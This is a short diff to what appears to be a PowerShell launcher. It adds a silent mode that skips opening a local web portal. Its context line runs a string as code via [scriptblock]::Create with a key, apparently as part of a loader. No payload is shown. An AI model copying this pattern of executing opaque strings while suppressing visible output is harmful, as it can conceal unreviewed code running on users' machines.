@@ -645,13 +645,17 @@ if(`$s){. ([scriptblock]::Create(`$s)) -Silent -Key `$k;break}
     }
 
     if ($started) {
-        Log-Msg "Opening web portal..."
-        try { 
-            (New-Object -ComObject Shell.Application).Open("http://127.0.0.1:9876/") 
-            Log-Msg "Portal successfully opened via Shell.Application."
-        } catch { 
-            Start-Process "http://127.0.0.1:9876/" 
-            Log-Msg "Portal successfully opened via Start-Process."
+        if (-not $Silent) {
+            Log-Msg "Opening web portal..."
+            try { 
+                (New-Object -ComObject Shell.Application).Open("http://127.0.0.1:9876/") 
+                Log-Msg "Portal successfully opened via Shell.Application."
+            } catch { 
+                Start-Process "http://127.0.0.1:9876/" 
+                Log-Msg "Portal successfully opened via Start-Process."
+            }
+        } else {
+            Log-Msg "Silent mode: skipping web portal launch."
         }
     } else {
         Log-Msg "WARNING: Loader did not respond within 20 seconds."
